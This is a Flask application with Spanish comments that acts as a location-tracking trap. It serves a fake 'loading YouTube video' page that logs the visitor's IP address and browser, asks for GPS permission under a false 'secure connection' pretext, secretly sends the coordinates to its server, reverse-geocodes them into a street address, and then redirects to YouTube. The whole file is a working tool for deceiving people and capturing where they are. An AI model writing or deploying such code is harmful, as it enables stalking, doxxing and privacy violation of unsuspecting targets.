from flask import Flask, request, render_template_string
import geocoder

app = Flask(__name__)

PAGINA_TRAMPA = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Cargando video de YouTube...</title>
    <style>
        body { background-color: #111; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <br>
    <h2>Comprobando conexión segura...</h2>
    <p>Por favor, acepta el permiso de la pantalla para continuar al video.</p>

    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                // Solicita el GPS del celular (Ventana flotante de Permitir/Denegar)
                navigator.geolocation.getCurrentPosition(enviarDatos, manejarError);
            } else {
                // Si el dispositivo no tiene GPS, solo redirige
                window.location.href = "https://youtu.be/kmlF2rw1weo?si=CDPwrUmuytxdYyee";
            }
        };

        function enviarDatos(posicion) {
            let lat = posicion.coords.latitude;
            let lon = posicion.coords.longitude;
            // Envía las coordenadas en secreto a nuestro servidor Python
            fetch(`/capturar_gps?lat=${lat}&lon=${lon}`).then(() => {
                window.location.href = "https://youtu.be/kmlF2rw1weo?si=CDPwrUmuytxdYyee";
            });
        }

        function manejarError(error) {
            // Si el usuario presiona "DENIEGAR", lo manda a YouTube de todos modos
            window.location.href = "https://youtu.be/kmlF2rw1weo?si=CDPwrUmuytxdYyee";
        }
    </script>
</body>
</html>
"""

@app.route('/')
def inicio():
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    print("\n--- [!]Linkabierto---")
    print(f"Dirección IP: {ip_cliente}")
    print(f"Dispositivo/Navegador: {user_agent}")
    print("-----------------------------------\n")
    return render_template_string(PAGINA_TRAMPA)

@app.route('/capturar_gps')
def capturar_gps():
    lat = request.args.get('lat')
    lon = request.args.get('lon')

    pais = "No encontrado"
    estado = "No encontrado"
    ciudad = "No encontrada"
    codigo_postal = "No encontrado"
    direccion_completa = "No encontrada"

    try:

        g = geocoder.osm([lat, lon], method='reverse')
        if g.ok:
            direccion_completa = g.address
            datos_mapa = g.json
            pais = datos_mapa.get('country', 'No encontrado')
            estado = datos_mapa.get('state', 'No encontrado')
            ciudad = datos_mapa.get('city') or datos_mapa.get('town') or datos_mapa.get('village') or 'No encontrada'
            codigo_postal = datos_mapa.get('postal', 'No encontrado')
    except Exception as e:
        direccion_completa = f"Error al traducir: {e}"

    print("\n--- [🔥] ¡UBICACIÓN EXACTA CAPTURADA! ---")
    print(f"Latitud: {lat}")
    print(f"Longitud: {lon}")
    print(f"País: {pais}")
    print(f"Estado/Región: {estado}")
    print(f"Ciudad: {ciudad}")
    print(f"Código Postal: {codigo_postal}")
    print(f"Dirección Completa: {direccion_completa}") 
    print(f"Ver en Google Maps: https://google.com{lat},{lon}")
    print("-----------------------------------------\n")
    return "OK", 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)